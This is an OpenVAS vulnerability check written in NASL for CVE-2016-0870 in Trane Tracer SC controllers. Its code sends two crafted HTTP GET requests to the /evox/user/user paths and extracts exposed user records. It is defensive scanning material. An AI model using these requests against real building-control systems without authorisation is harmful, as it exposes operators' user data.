##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_trane_trace_sc_info_disc_vuln.nasl 11982 2018-10-19 08:49:21Z mmartin $
#
# Trane Tracer SC Information Exposure Vulnerability (Remote)
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:trane:tracer_sc';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140281");
  script_version("$Revision: 11982 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 10:49:21 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-08-08 08:52:34 +0700 (Tue, 08 Aug 2017)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2016-0870");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Trane Tracer SC Information Exposure Vulnerability (Remote)");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_trane_tracer_sc_web_detect.nasl");
  script_mandatory_keys("trane_tracer/detected");
  script_require_ports("Services/www", 80, 443);

  script_tag(name:"summary", value:"Trane Tracer SC is prone to a information exposure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends two crafted HTTP GET requests and checks the responses.");

  script_tag(name:"insight", value:"The vulnerability allows an unauthorized party to obtain sensitive
information from the contents of configuration files not protected by the web server.");

  script_tag(name:"affected", value:"Trane Tracer SC version 4.2.1134 and prior.");

  script_tag(name:"solution", value:"Contact the vendor for an update.");

  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/advisories/ICSA-16-259-03");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

req = http_get(port: port, item: "/evox/user/user");
res = http_keepalive_send_recv(port: port, data: req);

id = eregmatch(pattern: '([0-9]+)/" is="trane:SC/user/user_', string: res);
if (!isnull(id[1])) {
  url = "/evox/user/user/" + id[1];
  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req);

  if ('name="lastName"' >< res && 'href="firstName/"' >< res) {
    report = "It was possible to extract user information at " +
             report_vuln_url(port: port, url: url, url_only: TRUE) + ":\n\nResult:\n\n" + res;

    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
